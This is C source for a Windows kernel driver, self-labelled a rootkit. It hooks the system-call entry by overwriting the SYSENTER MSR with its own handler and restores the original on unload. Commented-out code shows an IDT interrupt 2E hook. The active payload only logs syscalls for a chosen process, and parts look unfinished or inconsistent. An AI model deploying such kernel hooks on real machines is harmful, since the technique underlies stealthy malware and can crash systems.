#include "idthook.h"
#include "hookssdt.h"

__int64 d_origKiFastCallEntry;
ULONGLONG KiRealSystemServiceISR_Ptr; /* the real interrupt 2E handler */
UCHAR Old_Entry_Content[16];
DWORD g_EDX; // Global set with the address of the function parameters so we do not have to pass them on the stack

VOID MyKiFastCallEntry()
{
	Ktrace("ROOTKIT:Enter\n");
	//JmpOrigEntry(d_origKiFastCallEntry);
}

//__declspec(naked) MyKiSystemService()
///* thanks to mad russians */
//{
//	__asm{
//		pushad;
//		pushfd;
//		push fs;
//		mov bx, 0x30;
//		mov fs, bx;
//		push ds;
//		push es;
//		mov ebx, eax;
//	TestPID:
//		call getPID;
//		cmp  eax, gProcessID;
//		jne  Finish;
//
//	TestSyscallLimit:
//		cmp ebx, gSyscallLimit;
//		jge  Finish;
//
//	PrintDebug:
//		mov  g_EDX, edx;
//		push ebx;
//		call PrintDbg;
//
//	Finish:
//		pop es;
//		pop ds;
//		pop fs;
//		popfd;
//		popad;
//		jmp	KiRealSystemServiceISR_Ptr;
//	}
//}

ULONG getPID()
{
	return (ULONG)PsGetCurrentProcessId();
}


void PrintDbg(ULONG syscall)
{
	DbgPrint("%s:%u just called Syscall: %u\n", (PCHAR)PsGetCurrentProcess() + gProcessNameOffset, PsGetCurrentProcessId(), syscall);
	/*char *fname = NULL;

	if ((long)syscall >= KeServiceDescriptorTable.NumberOfServices)
		DbgPrint("%s:%u just called Syscall: %u\n", (char *)PsGetCurrentProcess() + gProcessNameOffset, PsGetCurrentProcessId(), syscall);
	else
	{
		if (name_array != NULL)
		{
			DbgPrint("%s:%u just called Syscall: %s\n", (char *)PsGetCurrentProcess() + gProcessNameOffset, PsGetCurrentProcessId(), name_array + (syscall*FUNC_NAME_LEN));
			fname = name_array + (syscall*FUNC_NAME_LEN);
			if (strcmp(fname, "NtCreateFile") == 0)
				PrintNtCreateFile();
			else if (strcmp(fname, "NtCreateDirectoryObject") == 0)
				PrintNtCreateDirectoryObject();
			else if (strcmp(fname, "NtCreateEvent") == 0)
				PrintNtCreateEvent();
			else if (strcmp(fname, "NtCreateEventPair") == 0)
				PrintNtCreateEventPair();

		}
		else
			DbgPrint("%s:%u just called Syscall: %u\n", (char *)PsGetCurrentProcess() + gProcessNameOffset, PsGetCurrentProcessId(), syscall);
	}*/
}

int HookInterrupts()
{
	//IDTINFO idt_info;
	//IDTENTRY* idt_entries;
	//IDTENTRY* int2e_entry;
	//__sidt(&idt_info);
	///*__asm{
	//	sidt idt_info;
	//}*/

	//idt_entries = (IDTENTRY*)*(PULONGLONG)&idt_info.LowIDTbase;

	//KiRealSystemServiceISR_Ptr = (ULONGLONG)((ULONGLONG)idt_entries[NT_SYSTEM_SERVICE_INT].HiOffset) << 32 | ((DWORD)idt_entries[NT_SYSTEM_SERVICE_INT].LowhOffset << 16) | (idt_entries[NT_SYSTEM_SERVICE_INT].LowlOffset);
	//Ktrace("ROOTKIT: idt_entries %x-%llx\n", NT_SYSTEM_SERVICE_INT, KiRealSystemServiceISR_Ptr);

	///*******************************************************
	//* Note: we can patch ANY interrupt here
	//* the sky is the limit
	//*******************************************************/
	//int2e_entry = &(idt_entries[NT_SYSTEM_SERVICE_INT]);
	//memcpy(Old_Entry_Content, int2e_entry, 16);
	//InterlockedExchange64((LONG64 *)int2e_entry, 0xffffffffffffffff);

	///*__asm{
	//	cli;
	//	lea rax, MyKiSystemService;
	//	mov rbx, int2e_entry;
	//	mov [rbx], eax;
	//	shr rax, 32;
	//	mov [ebx + 32], eax;

	//	lidt idt_info;
	//	sti;
	//}*/

	d_origKiFastCallEntry = __readmsr(0x176);
	Ktrace("ROOTKIT:d_origKiFastCallEntry : %llx\n", d_origKiFastCallEntry);
	//Ktrace("ROOTKIT:d_origKiFastCallEntry : %llx\n", MyKiFastCallEntry);
	//JmpOrigEntry(d_origKiFastCallEntry);
	__writemsr(0x176, (ULONGLONG)JmpOrigEntry);
	return 0;
}

/* _______________________________________________________________________________
. What is hooked must be unhooked ;-)
. _______________________________________________________________________________ */
int UnhookInterrupts()
{
	//IDTINFO idt_info;
	//IDTENTRY* idt_entries;
	//IDTENTRY* int2e_entry;
	//__sidt(&idt_info);
	///*__asm{
	//	sidt idt_info;
	//}*/

	//idt_entries = (IDTENTRY*)*(PULONGLONG)&idt_info.LowIDTbase;

	//int2e_entry = &(idt_entries[NT_SYSTEM_SERVICE_INT]);
	//InterlockedExchange64((LONG64 *)int2e_entry, *(PLONGLONG)&Old_Entry_Content);
	///*__asm{
	//	cli;
	//	mov rax, KiRealSystemServiceISR_Ptr;
	//	mov rbx, int2e_entry;
	//	mov [rbx], eax;
	//	shr rax, 32;
	//	mov [rbx + 32], eax;

	//	lidt idt_info;
	//	sti;
	//}*/

	__writemsr(0x176, d_origKiFastCallEntry);
	return 0;
}

NTSTATUS IH_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	HookInterrupts();
	return STATUS_SUCCESS;
}

VOID IH_OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UnhookInterrupts();
}